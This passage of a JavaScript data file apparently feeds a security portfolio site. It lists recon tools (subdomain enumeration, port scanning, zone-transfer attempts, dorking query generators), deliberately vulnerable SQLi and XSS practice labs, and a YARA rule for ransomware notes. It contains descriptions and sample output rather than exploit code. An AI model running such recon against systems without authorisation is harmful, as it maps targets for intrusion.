     "desc": "<strong>Rule-Based Detection</strong> — write rules combining string patterns, hex byte sequences, and regex to fingerprint specific malware families or behaviours."
    },
    {
     "desc": "<strong>Bulk File Scanning</strong> — scans entire directories or disk images against a ruleset to triage large numbers of suspicious files quickly."
    },
    {
     "desc": "<strong>Process Memory Scanning</strong> — scans live process memory for in-memory malware indicators that never touch disk."
    },
    {
     "desc": "<strong>Condition Logic</strong> — rules support boolean logic (AND/OR/NOT) combining multiple string and metadata conditions for precise detection."
    },
    {
     "desc": "<strong>Threat Intel Integration</strong> — widely used in VirusTotal, threat intel platforms, and EDR tools as the underlying detection engine for custom signatures."
    }
   ],
   "usage": {
    "label": "yara — scanning for malware patterns",
    "code": "<span class=\"cmt\"># rule file: ransomware_strings.yar</span>\n<span class=\"cmd\">rule Suspicious_Ransomware_Note {\n    strings:\n        $a = \"your files have been encrypted\" nocase\n        $b = \"send bitcoin to\" nocase\n    condition:\n        $a or $b\n}</span>\n<span class=\"cmd\">yara ransomware_strings.yar suspicious.exe</span>\n<span class=\"hi\">Suspicious_Ransomware_Note suspicious.exe</span>"
   },
   "tags": [
    "Malware Analysis",
    "Pattern Matching",
    "Threat Intel",
    "DFIR",
    "Detection Engineering"
   ],
   "group": "Malware Analysis",
   "docs": "https://yara.readthedocs.io/",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-mal",
     "label": "Malware Analysis (room)"
    }
   ]
  }
 },
 "projects": {
  "bbrecon": {
   "type": "Bug Bounty / Pentesting · Bash",
   "name": "Bug Bounty Recon Engine",
   "overview": "A self-contained Bash reconnaissance pipeline that automates the first mile of a bug bounty engagement — turning a single domain (or a list of them) into a structured, deduplicated attack-surface map. Wraps industry-standard tools (subfinder, httpx, nmap, katana, ffuf, gf, nuclei) into one checkpointed workflow that can be safely killed and resumed without redoing finished work.",
   "features": [
    {
     "text": "<strong>10-Phase Pipeline</strong> — subdomain enum &rarr; HTTP probing &rarr; port scan &rarr; URL/JS collection &rarr; fuzzing &rarr; parameter discovery &rarr; CI/CD exposure &rarr; Nuclei sweep &rarr; takeover checks."
    },
    {
     "text": "<strong>Resumable Checkpoints</strong> — every phase checkpoints on success; Ctrl+C saves state safely, <code>--resume</code> skips what already finished."
    },
    {
     "text": "<strong>Multi-Target Support</strong> — single domain, single IP, CIDR range, or a newline-delimited target list."
    },
    {
     "text": "<strong>Authenticated Recon</strong> — injects session cookies/headers into every downstream tool call; raw header values are never logged, only a session hash."
    },
    {
     "text": "<strong>Config Exposure &amp; Takeover Checks</strong> — flags exposed config files and CNAME-based subdomain takeover candidates."
    },
    {
     "text": "<strong>Graceful Degradation</strong> — missing optional tools are skipped with a warning, never a crash; cross-platform on Bash 3.2+."
    }
   ],
   "code": {
    "label": "recon_engine.sh — full scan",
    "body": "<span class=\"cmd\">./recon_engine.sh example.com</span>\n<span class=\"hi\">[01] DISCOVER   subdomains: 47 found</span>\n<span class=\"hi\">[02] PROBE      live hosts: 31</span>\n<span class=\"hi\">[03] ENUMERATE  ports scanned</span>\n<span class=\"out\">[06] DETECT     ffuf + config exposure check</span>\n<span class=\"warn\">[09] COMPLETE   Nuclei sweep — 3 medium, 1 high</span>\n<span class=\"hi\">[✓]   Resumable checkpoint saved after every phase</span>"
   },
   "stack": [
    "Bash",
    "subfinder",
    "httpx",
    "nmap",
    "katana",
    "ffuf",
    "nuclei"
   ],
   "github": "https://github.com/bhaktabsharma/BugBounty-Recon-Engine",
   "state": "public",
   "cat": "recon"
  },
  "reconkit": {
   "type": "Penetration Testing · Python v2.0",
   "name": "Automated Recon & Enumeration Toolkit v2.0",
   "overview": "A modular automated recon framework for authorised testing and lab practice. v2.0 ships with 6 active modules, stealth mode (capped threads + random jitter), passive recon via crt.sh and Wayback Machine, resume-from-checkpoint, YAML config file, and auto-generates a dark-theme HTML report after every scan.",
   "features": [
    {
     "text": "<strong>DNS Enumeration</strong> — A, AAAA, MX, NS, TXT, CNAME, SRV records · PTR/reverse DNS · DNSSEC check · AXFR zone transfer attempt."
    },
    {
     "text": "<strong>Multi-threaded Port Scanner</strong> — TCP + optional UDP · socket-based or nmap · stealth mode · CVE hint matching on 25+ vulnerable version strings."
    },
    {
     "text": "<strong>Subdomain Brute-Force + Passive</strong> — concurrent wordlist enumeration merged with crt.sh and Wayback Machine CDX API results."
    },
    {
     "text": "<strong>Web Fingerprinting</strong> — 25+ tech signatures · security header audit · SSL/TLS analysis · cookie flags · robots.txt · sitemap."
    },
    {
     "text": "<strong>Banner Grabbing + CVE Hints</strong> — service-specific probes for FTP, SSH, SMTP, Redis and more · matches 25+ vulnerable version strings to known CVEs."
    },
    {
     "text": "<strong>HTML Report</strong> — dark-theme report auto-saved after every scan: stats grid, open ports, CVE hints, subdomains, tech stack, endpoint breakdown."
    }
   ],
   "code": {
    "label": "recon_v2/main.py — full scan",
    "body": "<span class=\"cmd\">python3 main.py -t 10.10.x.x --ports 1-65535 --threads 300</span>\n<span class=\"hi\">[DNS]   A: 10.10.x.x  MX: mail.target.com  NS: ns1.target.com</span>\n<span class=\"hi\">[PORTS] Open: 22/ssh  80/http  443/https  445/smb</span>\n<span class=\"warn\">[CVE]   Apache 2.4.18 → CVE-2017-7679 applicable</span>\n<span class=\"hi\">[SUBS]  Found: dev.target.com  vpn.target.com</span>\n<span class=\"hi\">[✓]    Report: recon_10_10_x_x_20260519.html</span>"
   },
   "stack": [
    "Python 3.8+",
    "dnspython",
    "requests",
    "BeautifulSoup4",
    "socket",
    "threading",
    "pyyaml",
    "Jinja2"
   ],
   "github": "https://github.com/bhaktabsharma/ReconForge",
   "state": "public",
   "cat": "recon"
  },
  "sqlilab": {
   "type": "Web App Security · TypeScript",
   "name": "SQL Injection Practice Lab",
   "overview": "A full-stack SQL injection playground built for repeatable local practice — not a shared public target. React + TypeScript + Vite + Tailwind on the frontend, Node + Express + TypeScript on the backend, SQLite for storage. 53 labs span classic, blind, time-based, and second-order injection so every technique has a clean, resettable environment.",
   "features": [
    {
     "text": "<strong>53 Labs</strong> — classic, blind (boolean + time-based), UNION-based, and second-order SQL injection across difficulty tiers."
    },
    {
     "text": "<strong>Full-Stack TypeScript</strong> — React + Vite + Tailwind frontend talking to a Node + Express API."
    },
    {
     "text": "<strong>SQLite-Backed</strong> — every lab runs against its own local database so state resets cleanly between attempts."
    },
    {
     "text": "<strong>Runs Entirely Local</strong> — no shared infrastructure, no rate limits, safe to hammer with payloads."
    }
   ],
   "code": {
    "label": "sql-injection-lab/ — quick start",
    "body": "<span class=\"cmd\">git clone https://github.com/bhaktabsharma/SQL-INJECTION-LAB</span>\n<span class=\"cmd\">npm install && npm run dev</span>\n<span class=\"hi\">[✓] Frontend → http://localhost:5173</span>\n<span class=\"out\">[LABS] 53 ready · classic · blind · time-based · UNION</span>"
   },
   "stack": [
    "React",
    "TypeScript",
    "Vite",
    "Tailwind CSS",
    "Node.js",
    "Express",
    "SQLite"
   ],
   "github": "https://github.com/bhaktabsharma/SQL-INJECTION-LAB",
   "state": "public",
   "cat": "web"
  },
  "reconql": {
   "type": "Bug Bounty · Recon · JavaScript",
   "name": "ReconQL — Dorking & Recon Search Engine",
   "overview": "A Google-dorking recon search engine built for bug bounty hunting. 23 categories and 91 pre-built queries cover subdomain enumeration, API discovery, parameter discovery, exposed files, and login panels — no more hand-writing dork syntax mid-lab. Ships as a static site.",
   "features": [
    {
     "text": "<strong>91 Pre-Built Queries</strong> — organised into 23 recon categories so the right dork is always one click away."
    },
    {
     "text": "<strong>Broad Coverage</strong> — subdomains, APIs, parameters, exposed files, login panels, and more."
    },
    {
     "text": "<strong>Zero Backend</strong> — pure static site, deployable anywhere, loads instantly."
    },
    {
     "text": "<strong>Live &amp; Starred</strong> — actively used in real recon workflows, not just a demo."
    }
   ],
   "code": {
    "label": "reconql — live",
    "body": "<span class=\"cmt\"># Static site, no install needed</span>\n<span class=\"hi\">[✓] 23 categories · 91 queries indexed</span>\n<span class=\"cmd\">search: site:target.com inurl:api</span>\n<span class=\"hi\">→ 14 matching dork queries surfaced</span>"
   },
   "stack": [
    "JavaScript",
    "HTML/CSS",
    "GitHub Pages",
    "Google Dorking"
   ],
   "github": "https://github.com/bhaktabsharma/ReconQL-Passive-Recon-Console",
   "state": "public",
   "demo": "https://bhaktabsharma.github.io/ReconQL-Passive-Recon-Console/",
   "cat": "recon"
  },
  "crawlspace": {
   "type": "Bug Bounty · Recon · HTML/JS",
   "name": "Crawlspace — Attack Surface Discovery",
   "overview": "An attack-surface discovery taxonomy and query generator — 13 groups and 72 categories of testable vulnerability classes, each paired with a ready-to-use dorking query so nothing gets missed while scoping a target during recon.",
   "features": [
    {
     "text": "<strong>72 Categories</strong> — organised across 13 attack-surface groups as a recon checklist."
    },
    {
     "text": "<strong>Built-In Query Generator</strong> — every category pairs with a ready-made dork query."
    },
    {
     "text": "<strong>Dependency-Free</strong> — a single static page, no build step, no backend."
    },
    {
     "text": "<strong>Nothing Missed</strong> — designed to be run through methodically at the start of every target."
    }
   ],
   "code": {
    "label": "crawlspace — taxonomy browser",
    "body": "<span class=\"cmt\"># Open index.html — no install</span>\n<span class=\"hi\">[✓] 13 groups · 72 categories loaded</span>\n<span class=\"cmd\">select: \"IDOR candidates\"</span>\n<span class=\"hi\">→ dork query generated for target scope</span>"
   },
   "stack": [
    "HTML5",
    "JavaScript",
    "CSS",
    "Static Site"
   ],
   "github": "https://github.com/bhaktabsharma/Crawlspace-Attack-Surface",
   "state": "public",
   "demo": "https://bhaktabsharma.github.io/Crawlspace-Attack-Surface/",
   "cat": "recon"
  },
  "faultline": {
   "type": "Web App Security · Node.js",
   "name": "Faultline — Local Web Hacking Lab",
   "overview": "36 hands-on web application vulnerability labs across easy, medium, and hard difficulty — built to practice against locally with zero cloud dependency and nothing leaving your machine. Includes a dark/light mode toggle for long practice sessions.",
   "features": [
    {
     "text": "<strong>36 Labs</strong> — spread across 3 difficulty tiers, from foundational to advanced."
    },
    {
     "text": "<strong>Fully Local</strong> — zero cloud dependency, safe to practice against without touching shared infrastructure."
    },
    {
     "text": "<strong>Dark/Light Mode</strong> — a practice environment built for long sessions."
    },
    {
     "text": "<strong>Self-Contained</strong> — clone, install, run — no external services required."
    }
   ],
   "code": {
    "label": "faultline/ — quick start",
    "body": "<span class=\"cmd\">git clone https://github.com/bhaktabsharma/Faultline-Web-Security-Labs</span>\n<span class=\"cmd\">cd Faultline-Web-Security-Labs && npm install && npm start</span>\n<span class=\"hi\">[✓] Faultline running → http://localhost:3000</span>\n<span class=\"out\">[LABS] 36 loaded · Easy · Medium · Hard</span>"
   },
   "stack": [
    "Node.js",
    "Express",
    "JavaScript",
    "HTML/CSS",
    "Local-only"
   ],
   "github": "https://github.com/bhaktabsharma/Faultline-Web-Security-Labs",
   "state": "public",
   "cat": "web"
  },
  "casefile": {
   "type": "Security Knowledgebase · JavaScript",
   "name": "CaseFile — Personal Security Wiki",
   "overview": "A personal security knowledgebase and wiki — 979 topics organised into 16 categories, with full methodology write-ups (56 written so far) covering techniques, tools, and lessons learned across labs and CTF challenges, structured for fast recall mid-lab.",
   "features": [
    {
     "text": "<strong>979 Topics</strong> — organised across 16 categories spanning the full offensive security lifecycle."
    },
    {
     "text": "<strong>56 Write-Ups</strong> — full methodology documentation and growing."
    },
    {
     "text": "<strong>Built for Recall</strong> — structured to be searched quickly during a live lab, not browsed for leisure."
    },
    {
     "text": "<strong>A Personal Reference</strong> — curated notes, not a public wiki mirror."
    }
   ],
   "code": {
    "label": "casefile — search",
    "body": "<span class=\"cmt\"># Open index.html — no install</span>\n<span class=\"hi\">[✓] 979 topics indexed · 16 categories</span>\n<span class=\"cmd\">search: \"kerberoasting\"</span>\n<span class=\"hi\">→ 1 write-up match found</span>"
   },
   "stack": [
    "JavaScript",
    "HTML/CSS",
    "Static Site",
    "Knowledgebase"
   ],
   "github": "https://github.com/bhaktabsharma/CaseFile",
   "state": "public",
   "demo": "https://bhaktabsharma.github.io/CaseFile/",
   "cat": "kb"
  },
  "xsslab": {
   "type": "Web App Security · React / Vue / Next.js",
   "name": "XSS Bugs Lab",
   "overview": "A cross-site scripting practice lab covering 72 labs across reflected, stored, and DOM-based XSS — deliberately vulnerable React, Vue, and Next.js environments with SQLite-backed progress tracking, so each framework’s own XSS quirks get proper practice.",
   "features": [
    {
     "text": "<strong>72 Labs</strong> — spanning reflected, stored, and DOM-based XSS."
    },
    {
     "text": "<strong>Three Frameworks</strong> — deliberately vulnerable React, Vue, and Next.js targets."
    },
    {
     "text": "<strong>Progress Tracking</strong> — SQLite-backed so progress persists across sessions."
    },
    {
     "text": "<strong>Framework-Specific Quirks</strong> — covers the different XSS surfaces each stack introduces."
    }
   ],
   "code": {
    "label": "xss-bugs-lab/ — quick start",
    "body": "<span class=\"cmd\">git clone https://github.com/bhaktabsharma/XSS-Bugs-Lab</span>\n<span class=\"cmd\">npm install && npm run dev</span>\n<span class=\"hi\">[✓] 72 labs loaded · React · Vue · Next.js</span>\n<span class=\"out\">[DB] progress tracked in local SQLite</span>"
   },
   "stack": [
    "React",
    "Vue",
    "Next.js",
    "JavaScript",
    "SQLite"
   ],
   "github": "https://github.com/bhaktabsharma/XSS-Bugs-Lab",
   "state": "public",
   "cat": "web"
  }
 },
 "repos": {
  "bbrecon": {
   "name": "BugBounty-Recon-Engine",
   "lang": "Shell",
   "dot": "#89e051",
   "stars": 0,
   "forks": 0,
   "desc": "Bug Bounty Recon Engine — a 10-phase Bash reconnaissance pipeline. Subdomain enum, HTTP probing, port scanning, URL/JS collection, fuzzing, parameter discovery, CI/CD exposure, Nuclei sweep, and takeover checks, with resumable checkpoints.",
   "features": [
    {
     "text": "<strong>10-Phase Pipeline</strong> — subdomain enum through Nuclei vulnerability sweep."
    },
    {
     "text": "<strong>Resumable</strong> — every phase checkpoints; <code>--resume</code> skips finished work."
    },
    {
     "text": "<strong>Multi-Target</strong> — domain, IP, CIDR range, or target list."
    },
    {
     "text": "<strong>Authenticated Recon</strong> — session headers threaded through every tool, never logged raw."
    }
   ],
   "code": {
    "label": "./recon_engine.sh <target>",
    "body": "<span class=\"cmd\">./recon_engine.sh example.com</span>\n<span class=\"hi\">[01] DISCOVER   subdomains: 47 found</span>\n<span class=\"hi\">[02] PROBE      live hosts: 31</span>\n<span class=\"warn\">[09] COMPLETE   Nuclei sweep — 3 medium, 1 high</span>"
   },
   "github": "https://github.com/bhaktabsharma/BugBounty-Recon-Engine",
   "tags": [
    "Bash",
    "subfinder",
    "httpx",
    "nmap",
    "katana",
    "ffuf",
    "nuclei",
    "Recon"
   ],
   "state": "public",
   "aliases": [
    "Bug-Bounty-Recon-Tool"
   ]
  },
  "faultline": {
   "name": "Faultline-Web-Security-Labs",
   "lang": "JavaScript",
   "dot": "#f1e05a",
   "stars": 0,
   "forks": 0,
   "desc": "Faultline — 36 self-hosted web application vulnerability labs across easy, medium, and hard difficulty. Zero cloud dependency, dark/light mode, runs entirely on localhost.",
   "features": [
    {
     "text": "<strong>36 Labs</strong> — 3 difficulty tiers, easy to hard."
    },
    {
     "text": "<strong>Fully Local</strong> — no cloud dependency, safe to practice against."
    },
    {
     "text": "<strong>Dark/Light Mode</strong> — built for long practice sessions."
    },
    {
     "text": "<strong>Self-Contained</strong> — clone, install, run."
    }
   ],
   "code": {
    "label": "npm install && npm start",
    "body": "<span class=\"cmd\">git clone https://github.com/bhaktabsharma/Faultline-Web-Security-Labs</span>\n<span class=\"cmd\">npm install && npm start</span>\n<span class=\"hi\">[✓] http://localhost:3000 · 36 labs loaded</span>"
   },
   "github": "https://github.com/bhaktabsharma/Faultline-Web-Security-Labs",
   "tags": [
    "Node.js",
    "Express",
    "JavaScript",
    "Web App Security",
    "Local Lab"
   ],
   "state": "public",
   "aliases": [
    "Web-Hacking-Lab-local"
   ]
  },
  "sqlilab": {
   "name": "SQL-INJECTION-LAB",
   "lang": "TypeScript",
   "dot": "#3178c6",
   "stars": 0,
   "forks": 0,
   "desc": "Full-stack SQL injection playground — React + TypeScript + Vite + Tailwind frontend, Node + Express + TypeScript backend, SQLite storage. 53 labs across classic, blind, time-based, and second-order injection.",
   "features": [
    {
     "text": "<strong>53 Labs</strong> — classic, blind, time-based, UNION-based, second-order."
    },
    {
     "text": "<strong>Full-Stack TS</strong> — React/Vite/Tailwind + Express API."
    },
    {
     "text": "<strong>SQLite-Backed</strong> — clean reset between attempts."
    },
    {
     "text": "<strong>Runs Local</strong> — no shared infra, no rate limits."
    }
   ],
   "code": {
    "label": "npm install && npm run dev",
    "body": "<span class=\"cmd\">git clone https://github.com/bhaktabsharma/SQL-INJECTION-LAB</span>\n<span class=\"cmd\">npm install && npm run dev</span>\n<span class=\"hi\">[✓] http://localhost:5173 · 53 labs ready</span>"
   },
   "github": "https://github.com/bhaktabsharma/SQL-INJECTION-LAB",
   "tags": [
    "React",
    "TypeScript",
    "Vite",
    "Tailwind",
    "Node.js",
    "Express",
    "SQLite"
   ],
   "state": "public",
   "aliases": []
  },
  "reconql": {
   "name": "ReconQL-Passive-Recon-Console",
   "lang": "JavaScript",
   "dot": "#f1e05a",
   "stars": 1,
   "forks": 0,
   "desc": "ReconQL — Google dorking recon search engine for bug bounty hunting. 23 categories, 91 pre-built queries covering subdomains, APIs, parameters, exposed files, and login panels. Static site.",
   "features": [
    {
     "text": "<strong>91 Queries</strong> — across 23 recon categories."
    },
    {
     "text": "<strong>Broad Coverage</strong> — subdomains, APIs, parameters, exposed files."
    },
    {
     "text": "<strong>Zero Backend</strong> — static site, loads instantly."
    },
    {
     "text": "<strong>Live &amp; Starred</strong> — used in real recon workflows."
    }
   ],
   "code": {
    "label": "static site — no install",
    "body": "<span class=\"hi\">[✓] 23 categories · 91 queries indexed</span>\n<span class=\"cmd\">search: site:target.com inurl:api</span>\n<span class=\"hi\">→ 14 matching queries</span>"
   },
   "github": "https://github.com/bhaktabsharma/ReconQL-Passive-Recon-Console",
   "tags": [
    "JavaScript",
    "Google Dorking",
    "Recon",
    "Bug Bounty",
    "Static Site"
   ],
   "state": "public",
   "aliases": [
    "Dorking-Recon-Search-Engine"
   ],
   "demo": "https://bhaktabsharma.github.io/ReconQL-Passive-Recon-Console/"
  },
  "reconkit": {
   "name": "ReconForge",
   "lang": "Python",
   "dot": "#3572A5",
   "stars": 0,
   "forks": 0,
   "desc": "Modular automated recon framework v2.0 for authorised testing and lab practice. 6 active modules: DNS enumeration, multi-threaded port scanning, subdomain brute-force (+ passive via crt.sh), web fingerprinting with 25+ tech signatures, WHOIS/ASN, and banner grabbing with CVE hints. Outputs a dark-theme HTML report after every scan.",
   "features": [
    {
     "text": "<strong>DNS Enumeration</strong> — A, MX, NS, TXT, CNAME, SRV, DNSSEC, AXFR zone transfer."
    },
    {
     "text": "<strong>Port Scanner</strong> — multi-threaded TCP + UDP · nmap integration · stealth mode · CVE hints."
    },
    {
     "text": "<strong>Subdomain BF + Passive</strong> — wordlist + crt.sh + Wayback Machine sources merged and deduplicated."
    },
    {
     "text": "<strong>HTML Report</strong> — dark-theme report: ports, CVE hints, subdomains, tech stack, endpoint breakdown."
    }
   ],
   "code": {
    "label": "python3 main.py -t target --ports 1-65535",
    "body": "<span class=\"cmd\">python3 main.py -t 10.10.x.x --ports 1-65535 --threads 300</span>\n<span class=\"hi\">[+] Open: 22/ssh  80/http  445/smb</span>\n<span class=\"warn\">[CVE] Apache 2.4.18 → CVE-2017-7679</span>\n<span class=\"hi\">[✓] Report: recon_10_10_x_x_20260519.html</span>"
   },
   "github": "https://github.com/bhaktabsharma/ReconForge",
   "tags": [
    "Python",
    "DNS",
    "Port Scanner",
    "Subdomain",
    "Recon",
    "HTML Report",
    "Pentesting"
   ],
   "state": "public",
   "aliases": [
    "Automated-Recon-Enumeration-Toolkit"
   ]
  },
  "crawlspace": {
   "name": "Crawlspace-Attack-Surface",
   "lang": "HTML",
   "dot": "#e34c26",
   "stars": 0,
   "forks": 0,
   "desc": "Crawlspace — attack-surface discovery taxonomy and query generator. 13 groups, 72 categories of testable vulnerability classes, each paired with a ready-made dorking query.",
   "features": [
    {
     "text": "<strong>72 Categories</strong> — across 13 attack-surface groups."
    },
    {
     "text": "<strong>Query Generator</strong> — built into every category."
    },
    {
     "text": "<strong>Dependency-Free</strong> — single static page."
    },
    {
     "text": "<strong>Recon Checklist</strong> — run methodically per target."
    }
   ],
   "code": {
    "label": "static site — no install",
    "body": "<span class=\"hi\">[✓] 13 groups · 72 categories loaded</span>\n<span class=\"cmd\">select: \"IDOR candidates\"</span>\n<span class=\"hi\">→ dork query generated</span>"
   },
   "github": "https://github.com/bhaktabsharma/Crawlspace-Attack-Surface",
   "tags": [
    "HTML5",
    "JavaScript",
    "Recon",
    "Bug Bounty",
    "Static Site"
   ],
   "state": "public",
   "aliases": [
    "Attack-Surface-Candidates-Discovery"
   ],
   "demo": "https://bhaktabsharma.github.io/Crawlspace-Attack-Surface/"
  },
  "casefile": {
   "name": "CaseFile",
   "lang": "JavaScript",
   "dot": "#f1e05a",
   "stars": 0,
   "forks": 0,
   "desc": "Personal security knowledgebase and wiki — 979 topics across 16 categories, 56 full methodology write-ups and growing. Built for fast recall mid-lab.",
   "features": [
    {
     "text": "<strong>979 Topics</strong> — across 16 categories."
    },
    {
     "text": "<strong>56 Write-Ups</strong> — full methodology, growing."
    },
    {
     "text": "<strong>Built for Recall</strong> — fast search during live work."
    },
    {
     "text": "<strong>Personal Reference</strong> — curated, not a public mirror."
    }
   ],
   "code": {
    "label": "static site — no install",
    "body": "<span class=\"hi\">[✓] 979 topics indexed · 16 categories</span>\n<span class=\"cmd\">search: \"kerberoasting\"</span>\n<span class=\"hi\">→ 1 write-up match found</span>"
   },
   "github": "https://github.com/bhaktabsharma/CaseFile",
   "tags": [
    "JavaScript",
    "Knowledgebase",
    "Documentation",
    "Static Site"
   ],
   "state": "public",
   "aliases": [],
   "demo": "https://bhaktabsharma.github.io/CaseFile/"
  },
  "xsslab": {
   "name": "XSS-Bugs-Lab",
   "lang": "JavaScript",
   "dot": "#f1e05a",
   "stars": 0,
   "forks": 0,
   "desc": "XSS practice lab — 72 labs across reflected, stored, and DOM-based XSS in deliberately vulnerable React, Vue, and Next.js environments with SQLite-backed progress tracking.",
   "features": [
    {
     "text": "<strong>72 Labs</strong> — reflected, stored, DOM-based XSS."
    },
    {
     "text": "<strong>3 Frameworks</strong> — React, Vue, Next.js targets."
    },
    {
     "text": "<strong>Progress Tracking</strong> — SQLite-backed, persists across sessions."
    },
    {
     "text": "<strong>Framework Quirks</strong> — covers each stack’s own XSS surface."
    }
   ],
   "code": {
    "label": "npm install && npm run dev",
    "body": "<span class=\"cmd\">git clone https://github.com/bhaktabsharma/XSS-Bugs-Lab</span>\n<span class=\"cmd\">npm install && npm run dev</span>\n<span class=\"hi\">[✓] 72 labs loaded · React · Vue · Next.js</span>"
   },
   "github": "https://github.com/bhaktabsharma/XSS-Bugs-Lab",
   "tags": [
    "React",
    "Vue",
    "Next.js",
    "JavaScript",
    "SQLite",
    "XSS"
   ],
   "state": "public",
   "aliases": []
  }
 },
 "labels": {
  "blue": "Blue — EternalBlue",
  "invwin": "Investigating Windows",
  "memfor": "Memory Forensics",
  "pickle": "Pickle Rick",
  "pcap": "Network Analysis",
  "adpen": "Active Directory",
  "rm-blue": "Room · Blue",
  "rm-vol": "Room · Volatility",
  "rm-crypt": "Room · Crypto101",
  "rm-owasp": "Room · OWASP Top 10",
  "rm-osint": "Room · OSINT",
  "rm-lpe": "Room · Linux Privesc",
  "rm-ad": "Room · Active Directory",
  "rm-mal": "Room · Malware Analysis",
  "rm-ws": "Room · Wireshark",
  "rm-jrpt": "Room · Jr Pentester",
  "rm-soc": "Room · SOC Level 1",
  "rm-ir": "Room · Incident Response",
  "cert-ceh": "Credential · CEH v12",
  "cert-chfi": "Credential · CHFI",
  "cert-nvhdf": "Credential · NVH Digital Forensic",
  "cert-eh101": "Credential · Ethical Hacking 101"
 }
};
